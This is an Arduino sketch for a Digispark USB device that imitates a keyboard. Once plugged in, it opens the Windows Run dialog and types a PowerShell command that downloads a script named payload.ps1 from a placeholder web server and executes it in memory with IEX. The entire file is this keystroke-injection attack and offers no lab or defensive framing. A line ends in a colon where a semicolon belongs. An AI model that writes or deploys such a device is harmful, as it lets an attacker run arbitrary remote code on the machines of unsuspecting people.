#include "DigiKeyboard.h"
void setup() {
}

void loop(){
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\""):
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;) {
    // Stops the digispark from running  the script aain
  }
}
